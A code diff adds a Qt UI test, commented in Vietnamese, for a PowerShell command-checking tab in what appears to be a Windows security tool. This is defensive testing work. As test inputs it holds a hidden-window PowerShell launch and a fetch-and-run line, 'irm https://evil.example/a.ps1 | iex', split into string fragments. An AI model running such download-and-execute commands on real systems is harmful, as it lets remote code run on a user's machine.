@@ -17,6 +17,10 @@
 
 #include "core/AppPaths.h"
 
+#include <QCheckBox>
+#include <QPlainTextEdit>
+
+#include "tools/security/CommandGatewayTab.h"
 #include "tools/security/SecurityGatewayWindow.h"
 #include "tools/security/engine/DefenderController.h"
 #include "tools/security/engine/HostsBlocklist.h"
@@ -75,6 +79,74 @@ int main(int argc, char** argv)
 
     const auto labels = win.findChildren<QLabel*>();
     CHECK(labels.size() >= 3);
+
+    // ---- Máy trạng thái tab "Cổng lệnh PowerShell" (KHÔNG bao giờ bấm nút Mở PowerShell trong test này - luồng
+    // mở + dán thật được kiểm ở command_launcher_tests với console ẩn) ----
+    {
+        auto* tab = win.findChild<CommandGatewayTab*>();
+        CHECK(tab != nullptr);
+        auto* edit = tab ? tab->findChild<QPlainTextEdit*>() : nullptr;
+        auto* ack = tab ? tab->findChild<QCheckBox*>() : nullptr;
+        QPushButton* analyzeBtn = nullptr;
+        QPushButton* launchBtn = nullptr;
+        if (tab)
+            for (auto* b : tab->findChildren<QPushButton*>())
+            {
+                if (b->text().contains(QString::fromUtf8("Kiểm tra")))
+                    analyzeBtn = b;
+                else if (b->text().contains("PowerShell"))
+                    launchBtn = b;
+            }
+        CHECK(edit && ack && analyzeBtn && launchBtn);
+        // Nhãn hiện đúng "&" (không bị hiểu thành phím tắt - bản trước hiện "Mở PowerShell _dán lệnh")
+        CHECK(launchBtn && launchBtn->text().contains("&&"));
+        if (edit && ack && analyzeBtn && launchBtn)
+        {
+            auto analyze = [&](const QString& text) {
+                edit->setPlainText(text);
+                app.processEvents();
+                CHECK(!launchBtn->isEnabled()); // nội dung mới -> phải kiểm tra lại trước khi mở
+                analyzeBtn->click();
+                app.processEvents();
+            };
+            CHECK(!launchBtn->isEnabled()); // chưa kiểm tra gì
+
+            analyze("Get-Date");
+            CHECK(launchBtn->isEnabled());  // An toàn -> mở được ngay
+            CHECK(!ack->isVisibleTo(tab));
+
+            analyze(QString("powershell -w hid") + "den -File a.ps1"); // Đáng chú ý
+            CHECK(launchBtn->isEnabled());
+            CHECK(!ack->isVisibleTo(tab));
+
+            // Nguy hiểm: phải tích xác nhận mới bật nút (ghép từ mảnh - xem security_tests.cpp hàm S())
+            analyze(QString("irm https://evil.example/a.ps1 | i") + "ex");
+            CHECK(ack->isVisibleTo(tab));
+            CHECK(!ack->isChecked());
+            CHECK(!launchBtn->isEnabled());
+            ack->setChecked(true);
+            app.processEvents();
+            CHECK(launchBtn->isEnabled());
+            ack->setChecked(false);
+            app.processEvents();
+            CHECK(!launchBtn->isEnabled());
+
+            // Sửa nội dung sau khi đã xác nhận: xóa xác nhận cũ, khóa nút, ẩn kết luận cũ
+            ack->setChecked(true);
+            app.processEvents();
+            edit->setPlainText(edit->toPlainText() + " ");
+            app.processEvents();
+            CHECK(!ack->isChecked());
+            CHECK(!ack->isVisibleTo(tab));
+            CHECK(!launchBtn->isEnabled());
+
+            // Trống / chỉ khoảng trắng: không bao giờ bật nút
+            analyze("   \n\t ");
+            CHECK(!launchBtn->isEnabled());
+            edit->clear();
+            app.processEvents();
+        }
+    }
 
     // Chỉ đọc, an toàn - đọc trạng thái Windows Defender THẬT trên máy build.
     QString error;
